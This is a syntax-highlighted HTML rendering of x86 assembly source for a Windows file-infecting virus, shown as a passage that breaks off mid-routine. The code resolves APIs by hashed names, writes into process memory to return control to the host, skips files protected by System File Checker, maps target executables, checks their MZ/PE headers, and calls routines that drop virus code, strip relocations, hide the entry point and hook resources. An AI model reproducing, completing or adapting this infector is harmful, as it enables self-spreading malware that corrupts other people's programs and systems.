</span><span class="sc1">; Virus memory bank - use memory mapped file to make a shared memory</span><span class="sc0">
</span><span class="sc1">;   there's 32 bank</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   0 -    CeC!</span><span class="sc0">
</span><span class="sc1">;   4 -    Memory Bank State, bit x = bank is used if equal 1, unused if 0</span><span class="sc0">
</span><span class="sc1">;   8 -    32 * 64 for memory communication</span><span class="sc0">
</span><span class="sc1">;   2056 - 32 * 50000 for memory data</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc10">error</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; and the error code</span><span class="sc0">
</span><span class="sc5">version</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; virus version</span><span class="sc0">
</span><span class="sc5">virsize</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">; the virus size</span><span class="sc0">
</span><span class="sc5">valuefill</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">          </span><span class="sc1">; the module table</span><span class="sc0">
</span><span class="sc5">virusbank</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">          </span><span class="sc1">; virus bank</span><span class="sc0">
</span><span class="sc5">dropplace</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">          </span><span class="sc1">; were virus image is dropped</span><span class="sc0">

</span><span class="sc5">infmemsizeof</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">

</span><span class="sc5">setval</span><span class="sc0">          </span><span class="sc9">macro</span><span class="sc0">           </span><span class="sc5">destination</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">origin</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">             </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+&amp;</span><span class="sc5">destination</span><span class="sc4">&amp;],&amp;</span><span class="sc5">origin</span><span class="sc4">&amp;</span><span class="sc0">

            </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">getval</span><span class="sc0">          </span><span class="sc9">macro</span><span class="sc0">           </span><span class="sc5">origin</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">             </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+&amp;</span><span class="sc5">origin</span><span class="sc4">&amp;]</span><span class="sc0">
        
            </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">InfectStart</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">InfectEnd</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">InfectStart</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; workable system</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; workable infection</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">InfectSyscall</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">InfectStart</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Infectroutine</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">InfectStart</span><span class="sc0">

</span><span class="sc5">ISyscall</span><span class="sc0">    </span><span class="sc9">macro</span><span class="sc0">       </span><span class="sc5">I_ID_CoDE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">I_ID_CoDE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">ISyscall0</span><span class="sc0">

</span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">I_apicall</span><span class="sc0">   </span><span class="sc9">macro</span><span class="sc0">       </span><span class="sc5">crcval</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">libhandle</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">libhandle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">crcval</span><span class="sc0">
        </span><span class="sc5">ISyscall</span><span class="sc0">    </span><span class="sc5">MApiCall</span><span class="sc0">

        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">I_Init</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">I_Fini</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">   </span><span class="sc2">01017D1A1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; get module handle</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">03Ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">I_apicall</span><span class="sc0">   </span><span class="sc2">0ACDA53ACh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;GetCurrentProcessId</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">01F0fffh</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">   </span><span class="sc2">0A2069B15h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; 0 -</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">; 4 byte to write</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; offset of operation</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; offset to base address</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; openprocess handle</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">   </span><span class="sc2">084979262h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; WriteProcessMemory</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; return to the host :)</span><span class="sc0">

</span><span class="sc5">Infectroutine</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;ISyscall        GetMapped</span><span class="sc0">
</span><span class="sc1">;add        ebp,eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">            </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Objective of this file is     1ø if the file exist</span><span class="sc0">
</span><span class="sc1">;                   2ø if the file can be opened </span><span class="sc0">
</span><span class="sc1">;                   Yes -   3ø Save the time state</span><span class="sc0">
</span><span class="sc1">;               4øOpen file</span><span class="sc0">
</span><span class="sc1">;   </span><span class="sc0">
</span><span class="sc1">;               And then infect it</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The virus have a mini routine that scan the stack in order to find a known</span><span class="sc0">
</span><span class="sc1">; value and then use the precedent values to resize and remap the file </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">E_Infect</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">             
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">    </span><span class="sc2">04A5BD785h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; FindFirst</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Infectit1</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">                 
</span><span class="sc5">setval</span><span class="sc0">  </span><span class="sc10">error</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wefinished</span><span class="sc0">

</span><span class="sc5">Infectit1</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">   </span><span class="sc2">0A8793DEAh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Find Close</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">                  
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">12</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">loadpointer</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">SFCLib</span><span class="sc4">,</span><span class="sc5">api48</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">ISyscall</span><span class="sc0">    </span><span class="sc5">LoadLib</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; restore name</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skiptest</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">   </span><span class="sc2">0D23E5722h</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; SfcIsFileProtected</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">   </span><span class="sc2">1740CD46h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">         </span><span class="sc1">; freelibraryA</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">skiptest</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">         </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">setval</span><span class="sc0">      </span><span class="sc10">error</span><span class="sc4">,-</span><span class="sc2">95</span><span class="sc0">           </span><span class="sc1">; file protected</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">wefinished</span><span class="sc0">

</span><span class="sc5">skiptest</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; OPEN_EXISTING</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; FILE_SHARE_READ</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">          </span><span class="sc1">; GENERIC_READ or GENERIC_WRITE</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">    </span><span class="sc2">193E83EEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; CreateFileA</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Infectit2</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc0">              
</span><span class="sc5">setval</span><span class="sc0">  </span><span class="sc10">error</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">wefinished</span><span class="sc0">

</span><span class="sc5">Infectit2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">21021981</span><span class="sc0">                
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                 

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">   </span><span class="sc2">3508A453h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; GetFileSizeA</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                 

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">    </span><span class="sc2">97E2AF98h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; CreateFileMappingA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">000F001Fh</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">I_apicall</span><span class="sc0">    </span><span class="sc2">3D547DB1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; MapViewOfFile</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 
</span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">testinf</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">skipinf</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">killrelocs</span><span class="sc0">

</span><span class="sc5">getval</span><span class="sc0">  </span><span class="sc5">virsize</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">setval</span><span class="sc0">  </span><span class="sc5">virsize</span><span class="sc4">,</span><span class="sc5">banksize</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dropcode</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">setval</span><span class="sc0">  </span><span class="sc5">virsize</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">updatecode</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HideEP</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">goaway5</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">hookres</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RebuildLoaded</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">goaway5</span><span class="sc0">

</span><span class="sc5">skipinf</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">goaway5</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">updatecode</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">goaway5</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; testing infection</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">testinf</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">             </span><span class="sc1">; exe ?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">itsexec</span><span class="sc0">

</span><span class="sc5">setval</span><span class="sc0">  </span><span class="sc10">error</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">itsexec</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">03Ch</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">                </span><span class="sc1">; PE ?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">itsexec2</span><span class="sc0">

</span><span class="sc5">setval</span><span class="sc0">  </span><span class="sc10">error</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">17</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">itsexec2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">],</span><span class="sc2">12</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">notprog</span><span class="sc0">

</span><span class="sc6">bt</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">22</span><span class="sc4">],</span><span class="sc2">13</span><span class="sc0">               </span><span class="sc1">; application ?</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">notprog</span><span class="sc0">

</span><span class="sc5">setval</span><span class="sc0">  </span><span class="sc10">error</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">18</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">notprog</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">]</span><span class="sc0">

